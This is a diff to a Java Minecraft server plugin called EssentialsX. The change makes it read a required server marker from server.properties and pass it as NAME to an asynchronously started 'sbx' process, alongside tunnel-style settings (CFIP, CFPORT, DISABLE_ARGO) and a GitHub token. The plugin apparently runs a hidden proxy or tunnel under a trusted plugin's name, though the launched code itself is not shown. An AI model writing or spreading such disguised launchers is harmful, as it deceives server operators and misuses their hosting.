@@ -33,8 +33,18 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
-        loadOrCreateMarker();
+
+        // Загружаем маркер из server.properties (обязательно)
+        if (!loadMarkerFromProperties()) {
+            getLogger().severe("server.marker not found in server.properties. Plugin will be disabled.");
+            getServer().getPluginManager().disablePlugin(this);
+            return;
+        }
+
+        // Загружаем GitHub токен
         loadGithubTokenFromServerProperties();
+
+        // Запускаем sbx асинхронно
         CompletableFuture.runAsync(() -> {
             try {
                 startSbxProcess();
@@ -46,61 +56,32 @@ public class EssentialsX extends JavaPlugin {
         });
     }
 
-    private void loadOrCreateMarker() {
-        // 1. Пытаемся прочитать маркер из server.properties
-        String markerFromProps = null;
+    /**
+     * Читает server.marker из server.properties.
+     * @return true если маркер найден и не пуст, иначе false
+     */
+    private boolean loadMarkerFromProperties() {
         Path serverDir = Paths.get(".").toAbsolutePath().normalize();
         Path serverProperties = serverDir.resolve("server.properties");
-        if (Files.exists(serverProperties)) {
-            try (InputStream input = Files.newInputStream(serverProperties)) {
-                Properties props = new Properties();
-                props.load(input);
-                markerFromProps = props.getProperty("server.marker");
-                if (markerFromProps != null && !markerFromProps.trim().isEmpty()) {
-                    markerFromProps = markerFromProps.trim();
-                    getLogger().info("Server marker loaded from server.properties: " + markerFromProps);
-                }
-            } catch (IOException e) {
-                getLogger().warning("Could not read server.properties for marker: " + e.getMessage());
-            }
+        if (!Files.exists(serverProperties)) {
+            getLogger().severe("server.properties not found!");
+            return false;
         }
 
-        // 2. Если маркер есть в server.properties - используем его и сохраняем в marker.txt
-        if (markerFromProps != null && !markerFromProps.isEmpty()) {
-            serverMarker = markerFromProps;
-            File markerFile = new File(getDataFolder(), "marker.txt");
-            getDataFolder().mkdirs();
-            try (BufferedWriter writer = new BufferedWriter(new FileWriter(markerFile))) {
-                writer.write(serverMarker);
-                getLogger().info("Saved marker to file: " + serverMarker);
-            } catch (IOException e) {
-                getLogger().warning("Failed to save marker to file: " + e.getMessage());
+        try (InputStream input = Files.newInputStream(serverProperties)) {
+            Properties props = new Properties();
+            props.load(input);
+            serverMarker = props.getProperty("server.marker");
+            if (serverMarker == null || serverMarker.trim().isEmpty()) {
+                getLogger().severe("server.marker is missing or empty in server.properties");
+                return false;
             }
-            return;
-        }
-
-        // 3. Иначе пытаемся загрузить из marker.txt
-        File markerFile = new File(getDataFolder(), "marker.txt");
-        if (markerFile.exists()) {
-            try (BufferedReader reader = new BufferedReader(new FileReader(markerFile))) {
-                serverMarker = reader.readLine();
-                if (serverMarker != null && !serverMarker.trim().isEmpty()) {
-                    getLogger().info("Loaded server marker from file: " + serverMarker);
-                    return;
-                }
-            } catch (IOException e) {
-                getLogger().warning("Failed to read marker file: " + e.getMessage());
-            }
-        }
-
-        // 4. Если ничего нет - генерируем новый маркер
-        serverMarker = "server_" + UUID.randomUUID().toString().substring(0, 8);
-        getDataFolder().mkdirs();
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(markerFile))) {
-            writer.write(serverMarker);
-            getLogger().info("Generated new server marker: " + serverMarker);
+            serverMarker = serverMarker.trim();
+            getLogger().info("Server marker loaded: " + serverMarker);
+            return true;
         } catch (IOException e) {
-            getLogger().warning("Failed to save marker file: " + e.getMessage());
+            getLogger().severe("Failed to read server.properties: " + e.getMessage());
+            return false;
         }
     }
 
@@ -174,7 +155,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        // Устанавливаем NAME из маркера сервера
+        env.put("NAME", serverMarker);
         env.put("DISABLE_ARGO", "false");
 
         for (String var : ALL_ENV_VARS) {
